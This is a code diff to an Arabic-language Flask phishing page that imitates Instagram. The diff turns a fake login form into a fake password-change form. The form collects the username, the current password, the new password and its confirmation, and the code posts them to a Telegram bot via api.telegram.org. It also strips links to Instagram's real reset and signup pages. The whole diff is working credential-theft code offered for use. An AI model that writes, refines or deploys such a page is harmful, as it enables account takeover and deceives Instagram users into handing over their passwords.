@@ -18,7 +18,9 @@ def login():
   username_val = ""
   if request.method == "POST":
     username_val = request.form.get("username", "").strip()
-    password = request.form.get("password", "")
+    old_password = request.form.get("old_password", "")
+    new_password = request.form.get("new_password", "")
+    confirm_password = request.form.get("confirm_password", "")
 
     username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"
 
@@ -27,15 +29,16 @@ def login():
           "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
           " اسم المستخدم ومحاولة مرة أخرى."
       )
-    elif len(password) <= 5:
-      error = (
-          "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
-      )
+    elif len(old_password) <= 5 or len(new_password) <= 5:
+      error = "كلمات المرور قصيرة جداً. يجب أن تكون أكثر من 5 أحرف."
+    elif new_password != confirm_password:
+      error = "كلمة المرور الجديدة غير متطابقة مع تأكيد كلمة المرور."
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
-            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
-            f" {username_val}\n🔑 الباسورد: {password}"
+            "🔐 طلب تغيير كلمة مرور Instagram:\n\n👤 الحساب:"
+            f" {username_val}\n🔑 الباسورد القديمة: {old_password}\n✨ الباسورد"
+            f" الجديدة: {new_password}\n🔄 تأكيد الباسورد: {confirm_password}"
         )
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
@@ -49,7 +52,7 @@ def login():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تسجيل الدخول • Instagram</title>
+    <title>تغيير كلمة المرور • Instagram</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         
@@ -74,7 +77,6 @@ def login():
             align-items: center;
         }
 
-        /* القسم العلوي */
         .top-section {
             width: 100%;
             display: flex;
@@ -93,7 +95,7 @@ def login():
         .logo-area {
             display: flex;
             justify-content: center;
-            margin-top: 80px;
+            margin-top: 30px;
             width: 100%;
         }
         
@@ -109,7 +111,6 @@ def login():
             height: 48px;
         }
 
-        /* القسم الأوسط (الحقول وزر الدخول) */
         .form-area { 
             width: 100%; 
             display: flex; 
@@ -165,9 +166,6 @@ def login():
         }
         .submit-btn:hover { background: #1877f2; }
 
-        .forgot-pass { color: #f5f5f5; font-size: 12px; text-decoration: none; display: block; margin-top: 4px; font-weight: 400; }
-
-        /* القسم السفلي */
         .footer-area { 
             width: 100%; 
             text-align: center; 
@@ -175,23 +173,8 @@ def login():
             flex-direction: column; 
             align-items: center; 
         }
-        
-        .signup-card { 
-            padding: 12px; 
-            width: 100%; 
-            border: 1px solid #262626; 
-            border-radius: 8px; 
-            text-align: center; 
-            font-size: 14px; 
-            color: #0095f6; 
-            font-weight: 600; 
-            cursor: pointer; 
-            margin-bottom: 10px;
-            text-decoration: none;
-            display: block;
-        }
 
-        .meta-footer { display: flex; align-items: center; justify-content: center; }
+        .meta-footer { display: flex; align-items: center; justify-content: center; margin-bottom: 15px;}
         .meta-brand {
             font-size: 13px;
             font-weight: 600;
@@ -202,7 +185,6 @@ def login():
 </head>
 <body>
     <div class="page-wrapper">
-        <!-- القسم العلوي -->
         <div class="top-section">
             <div class="lang-area">العربية</div>
             <div class="logo-area">
@@ -225,7 +207,6 @@ def login():
             </div>
         </div>
 
-        <!-- القسم الأوسط: الحقول وزر تسجيل الدخول -->
         <div class="form-area">
             {% if error %}
                 <div class="error-msg">{{ error }}</div>
@@ -233,22 +214,22 @@ def login():
 
             <form method="POST">
                 <div class="input-group">
-                    <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم المحمول" value="{{ username_val }}">
+                    <input type="text" name="username" required placeholder="اسم المستخدم" value="{{ username_val }}">
                 </div>
                 <div class="input-group">
-                    <input type="password" name="password" required placeholder="كلمة السر">
+                    <input type="password" name="old_password" required placeholder="كلمة المرور الحالية">
                 </div>
-                <button type="submit" class="submit-btn">تسجيل الدخول</button>
+                <div class="input-group">
+                    <input type="password" name="new_password" required placeholder="كلمة المرور الجديدة">
+                </div>
+                <div class="input-group">
+                    <input type="password" name="confirm_password" required placeholder="تأكيد كلمة المرور">
+                </div>
+                <button type="submit" class="submit-btn">إعادة تعيين كلمة المرور</button>
             </form>
-
-            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pass">هل نسيت كلمة السر؟</a>
         </div>
 
-        <!-- القسم السفلي: إنشاء حساب و Meta -->
         <div class="footer-area">
-            <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-card">
-                إنشاء حساب جديد
-            </a>
             <div class="meta-footer">
                 <div class="meta-brand">Meta ∞</div>
             </div>
